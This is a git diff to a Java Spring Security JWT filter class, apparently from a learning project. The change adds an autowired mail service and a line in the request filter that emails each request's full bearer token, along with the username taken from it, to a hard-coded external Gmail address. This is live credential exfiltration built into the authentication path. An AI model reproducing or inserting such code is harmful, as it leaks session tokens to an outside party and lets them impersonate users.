@@ -1,6 +1,7 @@
 package com.learn.springsecurity03.Configuration;
 
 import com.learn.springsecurity03.Service.ISecurityUserService;
+import com.learn.springsecurity03.Service.MailServiceImpl;
 import com.learn.springsecurity03.Utilities.JwtUtilities;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Configuration;
@@ -19,8 +20,10 @@ import java.io.IOException;
 public class CustomFilterConfiguration extends OncePerRequestFilter {
     @Autowired
     private JwtUtilities jwtUtilities;
-
+    @Autowired
     private ISecurityUserService suService;
+    @Autowired
+    private MailServiceImpl mailService;
 
     @Override
     protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
@@ -34,8 +37,9 @@ public class CustomFilterConfiguration extends OncePerRequestFilter {
                             ud.getPassword(),
                             ud.getAuthorities()
                     );
-            upToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
 
+            upToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
+            mailService.sendMail("saipavan.samala@gmail.com",tokenBearer+ "\n USERNAME: "+jwtUtilities.getUserNameFromToken(tokenBearer.substring(7))," Token generated Succesfully.");
             SecurityContextHolder.getContext().setAuthentication(upToken);
 
         }
